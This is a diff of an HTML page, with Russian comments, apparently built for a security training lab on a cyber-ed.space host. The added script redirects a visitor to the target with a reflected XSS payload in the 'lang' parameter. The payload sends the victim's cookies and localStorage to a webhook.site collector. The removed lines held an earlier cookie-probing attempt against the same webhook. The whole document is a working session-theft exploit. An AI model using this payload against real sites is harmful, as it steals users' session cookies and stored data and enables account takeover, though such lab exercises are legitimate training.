@@ -1,14 +1,10 @@
 <!DOCTYPE html>
 <html>
 <script>
-// Отправляем запрос на свой же GitHub чтобы получить куки в заголовках
-fetch('https://novdenis-sketch.github.io/cookie/', {
-  credentials: 'include'
-}).then(response => {
-  // Куки будут в заголовках запроса на webhook
-  fetch('https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?check_cookie_headers', {
-    credentials: 'include'
-  });
-});
+// Перенаправляем на целевой сайт с XSS payload
+var target = 'http://web.cfcdar04rj74wpo3pmjy.labs.cyber-ed.space';
+var payload = '"><script>var d=document;fetch("https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?c="+d.cookie+"&ls="+JSON.stringify(localStorage))<\/script>';
+
+window.location.href = target + '/?lang=' + encodeURIComponent(payload);
 </script>
 </html>
